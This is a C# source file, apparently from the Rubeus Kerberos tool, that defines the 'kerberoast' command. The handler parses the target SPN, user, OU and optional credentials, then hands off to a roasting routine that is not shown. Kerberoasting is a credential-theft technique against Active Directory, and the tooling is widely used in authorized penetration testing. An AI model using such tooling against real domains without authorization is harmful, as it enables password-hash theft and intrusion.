using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Rubeus.Commands
{
    public class Kerberoast : ICommand
    {
        public static string CommandName => "kerberoast";

        public void Execute(Dictionary<string, string> arguments)
        {


            string spn = "";
            string user = "";
            string OU = "";

            if (arguments.ContainsKey("/spn"))
            {
                spn = arguments["/spn"];
            }
            if (arguments.ContainsKey("/user"))
            {
                user = arguments["/user"];
            }
            if (arguments.ContainsKey("/ou"))
            {
                OU = arguments["/ou"];
            }

            if (arguments.ContainsKey("/creduser"))
            {
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                    return;
                }

                string[] parts = arguments["/creduser"].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                if (!arguments.ContainsKey("/credpassword"))
                {
                    Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                    return;
                }

                string password = arguments["/credpassword"];

                System.Net.NetworkCredential cred = new System.Net.NetworkCredential(userName, password, domainName);

                Roast.Kerberoast(spn, user, OU, cred);
            }
            else
            {
                Roast.Kerberoast(spn, user, OU);
            }





        }
    }
}